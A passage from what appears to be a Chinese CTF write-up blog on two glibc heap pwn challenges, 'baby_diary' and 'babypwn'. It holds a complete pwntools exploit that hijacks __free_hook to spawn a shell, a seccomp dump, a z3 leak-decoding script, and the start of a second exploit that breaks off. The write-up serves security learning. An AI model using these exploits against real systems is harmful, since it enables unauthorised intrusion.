class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x427</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x426</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x01&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">&quot;\x0d&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">dele(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;\n&quot;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x208</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x1ff</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot; content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ec210</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>最后调整一下堆风水，劫持 tcache attack 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./baby_diary1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x17D7)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data=<span class="string">&quot;\n&quot;</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot; size:&quot;</span>,<span class="built_in">str</span>(size-<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot; content: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x378</span>,<span class="string">&quot;8&quot;</span>*<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x427</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x426</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x01&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">&quot;\x0d&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">dele(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&quot;\n&quot;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x208</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x1ff</span>*<span class="string">&quot;\x00&quot;</span>+<span class="string">&quot;\x0e&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot; content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ec210</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="number">0x100</span>*<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x178</span>*<span class="string">&quot;\x00&quot;</span>+p64(<span class="number">0x211</span>)+p64(free_hook)+p64(free_hook)</span><br><span class="line">add(<span class="number">0x300</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,p64(system))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babypwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">721</span>c84a30c78ecb82a98a6d484d884a502b54fd6, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>禁用 execve</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序在 edit 完后会将所有的 0x11 置空，但是没有限制范围：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">change</span><span class="params">(<span class="keyword">char</span> *chunk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *chunk == <span class="number">0x11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *chunk = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++chunk;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有 off-by-null 漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序的泄露模块需要逆向，先进行一波分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  a1 ^= (<span class="number">32</span> * a1) ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">13</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br></pre></td></tr></table></figure>
<p>直接使用 z3 求解，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">target</span>):</span></span><br><span class="line">    a1 = BitVec(<span class="string">&quot;a1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    x = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        a1 ^= (<span class="number">32</span> * a1) ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>)) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    x.add(target == a1)</span><br><span class="line">    <span class="keyword">if</span>(x.check()==sat):</span><br><span class="line">        model = <span class="built_in">str</span>(x.model())</span><br><span class="line">        <span class="built_in">print</span>(model)</span><br><span class="line">        pos, val = model.split(<span class="string">&#x27;=&#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">        re = <span class="built_in">eval</span>(val[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(re))</span><br><span class="line">    <span class="keyword">return</span> re</span><br></pre></td></tr></table></figure>
<ul>
<li>这里弄了好久，最后发现 z3 不能直接左移，要用对应的函数 LShR</li>
</ul>
<p>泄露 heap_base 很容易就能打 unlink 实现堆重叠，程序开了沙盒，需要使用堆上 ORW 的技术：</p>
<ul>
<li>限制了 size 大小（难以打 largebin attack），但通过劫持 tcache 可以打 IO</li>
<li>也可以通过 TLS 泄露栈地址，然后劫持 tcache 打栈</li>
</ul>
<p>这里我选择了后者（一般来说，程序如果限制 size 为 unsorted chunk 则选择前者，限制 size 为 tcache 就选择后者）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./babypwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> 